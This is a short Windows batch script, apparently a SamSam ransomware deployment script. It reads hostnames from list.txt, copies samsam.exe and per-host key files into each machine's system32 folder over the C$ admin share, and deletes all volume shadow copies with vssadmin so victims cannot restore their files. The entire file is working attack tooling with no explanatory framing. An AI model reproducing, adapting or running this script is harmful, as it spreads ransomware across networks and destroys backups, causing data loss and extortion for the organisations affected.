@echo off
for /f "delims=" %%a in (list.txt) do copy samsam.exe
\\%%a\C$\windows\system32 && copy %%a_PublicKey.keyxml
\\%%a\C$\windows\system32 && vssadmin delete shadows /all /quiet
pause
